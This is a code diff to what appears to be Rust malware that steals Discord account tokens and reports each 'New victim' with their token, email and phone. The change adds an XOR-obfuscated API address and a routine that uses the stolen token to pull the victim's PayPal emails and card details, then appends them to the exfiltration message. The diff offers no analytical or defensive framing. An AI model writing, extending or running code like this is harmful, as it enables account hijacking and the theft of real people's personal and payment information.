@@ -80,6 +80,15 @@ fn s_users_me() -> String {
     ])
 }
 
+fn s_billing_sources() -> String {
+    xor_str(&[
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
+        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
+        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F, 0x75, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x75,
+        0x2A, 0x3B, 0x23, 0x37, 0x3F, 0x34, 0x2E, 0x77, 0x29, 0x35, 0x2F, 0x28, 0x39, 0x3F, 0x29,
+    ])
+}
+
 fn s_auth_header() -> String {
     xor_str(&[0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34])
 }
@@ -143,6 +152,77 @@ async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
         })
     } else {
         None
+    }
+}
+
+fn capitalize_brand(brand: &str) -> String {
+    let mut chars = brand.chars();
+    match chars.next() {
+        None => String::new(),
+        Some(first) => {
+            first
+                .to_uppercase()
+                .chain(chars.flat_map(|c| c.to_lowercase()))
+                .collect()
+        }
+    }
+}
+
+async fn fetch_billing_info(client: &reqwest::Client, token: &str) -> String {
+    let res = match client
+        .get(s_billing_sources())
+        .header(s_auth_header(), token)
+        .send()
+        .await
+    {
+        Ok(r) if r.status().is_success() => r,
+        _ => return "No billing".to_string(),
+    };
+
+    let sources: Value = match res.json().await {
+        Ok(v) => v,
+        Err(_) => return "No billing".to_string(),
+    };
+
+    let arr = match sources.as_array() {
+        Some(a) => a,
+        None => return "No billing".to_string(),
+    };
+
+    let mut paypal_emails = Vec::new();
+    let mut cards = Vec::new();
+
+    for source in arr {
+        if let Some(email) = source.get("email").and_then(|e| e.as_str()) {
+            if !email.is_empty() {
+                paypal_emails.push(email.to_string());
+            }
+        }
+        if let (Some(last_4), Some(brand)) = (
+            source.get("last_4").and_then(|v| v.as_str()),
+            source.get("brand").and_then(|v| v.as_str()),
+        ) {
+            cards.push(format!("•••• {} ({})", last_4, capitalize_brand(brand)));
+        }
+    }
+
+    let paypal_part = if paypal_emails.is_empty() {
+        None
+    } else {
+        Some(format!("PayPal: {}", paypal_emails.join(", ")))
+    };
+
+    let cards_part = if cards.is_empty() {
+        None
+    } else {
+        Some(format!("Cards: {}", cards.join(", ")))
+    };
+
+    match (paypal_part, cards_part) {
+        (Some(p), Some(c)) => format!("{} | {}", p, c),
+        (Some(p), None) => p,
+        (None, Some(c)) => c,
+        (None, None) => "No billing information found".to_string(),
     }
 }
 
@@ -329,6 +409,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                     badges_display
                                                                 };
 
+                                                            let billing_info =
+                                                                fetch_billing_info(&client, &token)
+                                                                    .await;
+
                                                             let embed = json!({
                                                                 "embeds": [{
                                                                     "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
@@ -341,7 +425,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                         { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
                                                                         { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
                                                                         { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }
+                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false },
+                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }
                                                                     ],
                                                                     "footer": { "text": "VVS V3" },
                                                                     "timestamp": chrono::Utc::now().to_rfc3339()
